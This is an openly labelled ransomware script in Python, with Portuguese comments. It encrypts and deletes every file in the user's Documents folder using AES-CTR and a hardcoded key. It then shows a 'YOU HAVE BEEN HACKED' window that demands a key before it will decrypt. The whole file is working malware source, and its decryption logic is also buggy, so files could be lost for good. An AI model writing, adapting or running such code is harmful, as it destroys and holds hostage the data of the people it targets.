import os
from tkinter import *
from tkinter import messagebox
import time
import pyaes

# Pausa a execução por 2 segundos (pode simular algum carregamento)
time.sleep(2)

# Define o caminho da pasta "Documents" do usuário
path = os.path.expanduser("~\\Documents")

# Função responsável por criptografar os arquivos
def encrypting():
    # Percorre todos os diretórios e arquivos na pasta "Documents"
    for root, dirs, files, in os.walk(path):
        for f in files:
            # Junta o caminho do diretório com o nome do arquivo
            criptoPath = os.path.join(root, f)
            print(criptoPath)
            # Abre o arquivo para leitura em modo binário
            f = open(f'{criptoPath}', 'rb')
            file_data = f.read()
            f.close()
            # Remove o arquivo original
            os.remove(f'{criptoPath}')
            # Define a chave de criptografia (hardcoded)
            key = b"7c2e0cfd701d9001d2a1c3fe85cea847"
            # Inicializa o AES no modo CTR com a chave definida
            aes = pyaes.AESModeOfOperationCTR(key)
            # Criptografa os dados do arquivo
            crypto_data = aes.encrypt(file_data)
            # Cria um novo arquivo com a extensão ".encrypted"
            new_file = criptoPath + ".encrypted"
            new_file = open(f'{new_file}', 'wb')
            # Escreve os dados criptografados no novo arquivo
            new_file.write(crypto_data)
            new_file.close()

# Função que verifica se a chave inserida pelo usuário é a correta
def verify():
    # Pega a chave inserida no campo de texto
    key = ed1.get()
    # Se a chave for correta, descriptografa os arquivos
    if key == "SecretKey":
        decrypting("7c2e0cfd701d9001d2a1c3fe85cea847")
        # Percorre os arquivos para remover os arquivos ".encrypted"
        for root, dirs, files, in os.walk(path):
            for f in files:
                criptoPath = os.path.join(root, f)
                file_splited = criptoPath.split('.')
                try:
                    # Verifica se a extensão é ".encrypted" e remove o arquivo
                    if file_splited[2] == 'encrypted':
                        os.remove(f'{criptoPath}')
                except:
                    pass
        # Exibe mensagem de sucesso e fecha a janela
        messagebox.showinfo("CORRECT!", "EVERYTHING IS OKAY")
        roots.destroy()
    else:
        # Exibe mensagem de erro se a chave estiver incorreta
        messagebox.showwarning("WRONG ANSWER!", "INCORRECT")

# Função que descriptografa os arquivos
def decrypting(decrypt_file):
    # Percorre todos os arquivos novamente
    for root, dirs, files, in os.walk(path):
        for f in files:
            criptoPath = os.path.join(root, f)
            # Converte a chave de descriptografia para bytes
            keybytes = decrypt_file.encode()
            # Lê o arquivo criptografado
            name_file = open(criptoPath, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            # Inicializa o AES para descriptografia
            daes = pyaes.AESModeOfOperationCTR(dkey)
            # Descriptografa os dados
            decrypt_data = daes.decrypt(file_data)
            # Remove a extensão ".encrypted" do nome do arquivo
            format_file = criptoPath.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]
            # Salva o arquivo descriptografado com o nome original
            dnew_file = open(f'{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()

# Se o script for executado diretamente, inicia a criptografia e a interface gráfica
if __name__ == '__main__':
    # Chama a função de criptografia
    encrypting()
    if encrypting:
        # Cria a interface gráfica usando tkinter
        roots = Tk()
        roots.title("YOU HAVE BEEN HACKED")
        roots.geometry("500x500")
        lb2 = Label(roots, text="YOUR DATA IS ENCRYPTED!!! GOOD LUCK GUESSING THE KEY")

        # Campo de texto para o usuário inserir a chave
        global ed1
        ed1 = Entry(roots, bd=5)
        # Botão que confirma a chave e chama a função verify
        bt1 = Button(roots, text='Confirm', command=verify)

        # Posiciona os elementos na janela
        lb2.grid(row=1, column=4)
        ed1.grid(row=3, column=4)
        bt1.grid(row=5, column=4)
        # Mantém a janela aberta
        roots.mainloop()
